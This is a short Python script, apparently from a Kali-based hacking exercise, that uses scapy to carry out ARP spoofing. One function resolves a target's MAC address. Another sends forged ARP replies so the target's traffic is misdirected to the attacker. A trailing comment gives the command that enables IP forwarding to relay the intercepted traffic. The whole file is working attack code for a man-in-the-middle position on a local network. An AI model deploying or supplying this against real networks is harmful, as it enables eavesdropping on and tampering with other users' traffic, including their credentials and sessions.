import scapy.all as scapy

def get_mac(ip: str) -> str:
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return answered_list[0][1].hwsrc

def spoof(target_ip: str, spoof_ip: str) -> None:
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

if __name__ == '__main__':
    pass


# routing in kali: echo 1 > /proc/sys/net/ipv4/ip_forward